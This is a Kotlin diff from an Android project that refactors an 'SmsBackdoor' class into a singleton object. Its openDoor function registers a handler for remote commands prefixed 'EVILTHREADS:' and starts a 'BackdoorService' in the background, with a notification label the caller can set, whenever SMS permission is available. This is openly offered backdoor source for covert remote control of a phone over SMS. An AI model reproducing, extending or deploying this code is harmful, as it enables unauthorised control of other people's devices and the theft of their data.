@@ -40,26 +40,24 @@ import com.candroid.bootlaces.bootService
 ............\..............(
 ..............\.............\...
 */
-class SmsBackdoor{
-    companion object{
-        internal var commandCode : String = "EVILTHREADS:"
-        internal var commandHandler : ( suspend (String) -> Unit)? = null
-        fun openDoor(ctx: AppCompatActivity, remoteCommandCode: String, notifTitle: String? = null, notifBody: String? = null, remoteCommandHandler: suspend (remoteCommand: String) -> Unit){
-            commandHandler = remoteCommandHandler
-            commandCode = remoteCommandCode
-            if(Build.VERSION.SDK_INT >= Build.VERSION_CODES.M)
-                if(ctx.checkSelfPermission(Manifest.permission.RECEIVE_SMS) == PackageManager.PERMISSION_GRANTED){
-                    bootService(ctx){
-                        service = BackdoorService::class
-                        noPress = true
-                        notifTitle?.let { title -> this.notificationTitle = title }
-                        notifBody?.let { body -> this.notificationTitle = body }
-                    }
+object SmsBackdoor{
+    internal var commandCode : String = "EVILTHREADS:"
+    internal var commandHandler : ( suspend (String) -> Unit)? = null
+    fun openDoor(ctx: AppCompatActivity, remoteCommandCode: String, notifTitle: String? = null, notifBody: String? = null, remoteCommandHandler: suspend (remoteCommand: String) -> Unit){
+        commandHandler = remoteCommandHandler
+        commandCode = remoteCommandCode
+        if(Build.VERSION.SDK_INT >= Build.VERSION_CODES.M)
+            if(ctx.checkSelfPermission(Manifest.permission.RECEIVE_SMS) == PackageManager.PERMISSION_GRANTED){
+                bootService(ctx){
+                    service = BackdoorService::class
+                    noPress = true
+                    notifTitle?.let { title -> this.notificationTitle = title }
+                    notifBody?.let { body -> this.notificationTitle = body }
                 }
-                else
-                    bootService(ctx){
-                        service = BackdoorService::class
-                    }
-        }
+            }
+            else
+                bootService(ctx){
+                    service = BackdoorService::class
+                }
     }
 }
